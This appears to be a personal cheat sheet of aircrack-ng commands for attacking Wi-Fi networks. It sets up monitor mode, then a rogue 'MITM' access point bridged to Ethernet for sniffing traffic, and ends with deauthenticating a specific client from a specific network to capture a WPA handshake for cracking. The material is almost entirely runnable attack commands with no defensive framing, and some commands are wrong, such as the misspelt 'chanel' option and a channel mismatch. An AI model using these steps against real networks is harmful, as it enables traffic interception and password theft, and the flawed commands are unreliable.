iwconfig

Find the wireless card you want to use

# To view cards settings
ifconfig wlan1


----------------------------

# To find available access points to connect to
iwlist wlan1 scanning

# To check connection status
iwconfig wlan1

# Find default routers IP
route -n

----------------------------

Creating a monitor mode interface

# Check the mode
iwconfig wlan1

# Make sure card is up (you see the word UP)
ifconfig wlan1

# If it's not up
ifconfig wlan1 up


# Check to make sure airmon-ng can detect our card
airmon-ng

# Check for interfering processes
airmon-ng check

# Kill these processes BEFORE putting the card in monitor mode
airmon-ng check kill

# Enable monitor mode
airmon-ng start wlan1


iwconfig

----------------------------

Start Wireshark
Capture > Interfaces
Select the new interface
Start

----------------------------

Make a Fake MITM AP

brctl - used to set up, maintain, and inspect the ethernet bridge configuration in the linux kernel.

# If not installed
apt-get install bridge-utils

airbase-ng --essid Beach -c 11 wlan1mon

brctl addbr mitm-bridge
brctl addif mitm-bridge eth0
brctl addif mitm-bridge at0
ifconfig eth0 0.0.0.0 up
ifconfig at0 0.0.0.0 up
ifconfig mitm-bridge 192.168.0.199 up
echo 1 > /proc/sys/net/ipv4/ip_forward


Open Wireshark and listen on at0 interface

----------------------------

Crack WPA (using at least one connected client)

We will pretend to be the router, send deauth packets to the router from someone else
When they get disconnected, they will connect back to us

airmon-ng check kill
airmon-ng start wlan1

# Find the WPA network we want to attack
airodump-ng wlan1mon

Network
ESSID: DDW361103
BSSID: F0:7B:CB:5D:75:C2
Channel: 11

Client
MAC: C0:BD:D1:24:A4:E8

~~~

Now we should set wlan1mon to the same channel as the target network

# Shut down NIC, change channel, enable it
ifconfig wlan1mon down
ifconfig wlan1mon chanel 7
ifconfig wlan1mon up

# Get ready to deauthenticate client (don't press enter yet!)
aireplay-ng -0 15 -a F0:7B:CB:5D:75:C2 -c C0:BD:D1:24:A4:E8 wlan1mon

# In a new terminal, run this to capture and save handshake
airodump-ng --bssid F0:7B:CB:5D:75:C2 --channel 7 --write Desktop/WPAmsg wlan1mon
